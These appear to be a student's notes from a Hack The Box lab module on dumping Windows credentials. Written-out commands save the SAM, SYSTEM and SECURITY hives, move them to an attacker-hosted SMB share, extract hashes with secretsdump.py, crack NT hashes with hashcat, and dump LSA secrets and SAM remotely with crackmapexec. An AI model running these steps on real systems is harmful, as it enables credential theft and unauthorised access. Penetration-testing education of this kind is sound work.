With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database. With this we can start cracking hashes offline.

#### Copying SAM Registry Hives

There are three registry hives that we can copy if we have local admin access on the target
each will have a specific purpose when we get to dumping and cracking the hashes.

|                 |                                                                                                                                                            |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |
#### Using reg.exe save to Copy Registry Hives

open CMD as admin 

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Technically we will only need `hklm\sam` & `hklm\system`, but `hklm\security` can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.

Once the hives are saved offline, we can use various methods to transfer them to our attack host. In this case, let's use [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) in combination with some useful CMD commands to move the hive copies to a share created on our attack host.

#### Creating a Share with smbserver.py

```shell-session
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Know that the `smb2support` option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host.
#### Moving Hive Copies to Share

Once we have the share running on our attack host, we can use the `move` command on the Windows target to move the hive copies to the share.

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```
Then we can confirm that our hive copies successfully moved to the share by navigating to the shared directory on our attack host and using `ls` to list the files.
```shell-session
canklesmaks@htb[/htb]$ ls

sam.save  security.save  system.save
```

## Dumping Hashes with Impacket's secretsdump.py

One incredibly useful tool we can use to dump the hashes offline is Impacket's `secretsdump.py`. Impacket can be found on most modern penetration testing distributions. We can check for it by using `locate` on a Linux-based system

Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.

```shell-session
canklesmaks@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

* _**Most modern Windows operating systems store the password as an NT hash_
* Operating systems older than Windows Vista & Windows Server 2008 store passwords as an **LM hash

* Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords
	*  Iitmay be beneficial to make a note of each user, so we know which password is associated with which user account.

we can populate a text file with the NT hashes we were able to dump.

```shell-session
sudo vim hashestocrack.txt
```

#### Running Hashcat against NT Hashes

```shell-session
canklesmaks@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
* `-m` to select the hash type `1000` to crack our NT hashes
	* (also referred to as NTLM-based hashes).
	* using the infamous rockyou.txt wordlist mentioned in the [[Credential Storage]]section of this module.
* Keep in mind that this is a well-known technique, so admins may have safeguards to prevent and detect it.

## Remote Dumping & LSA Secrets Considerations

* ***LSA secrets is a special protected storage for important data used by the Local Security Authority (LSA) in Windows
	* With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network.
* We can use this to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords
#### Dumping LSA Secrets Remotely
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
#### Dumping SAM Remotely

```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```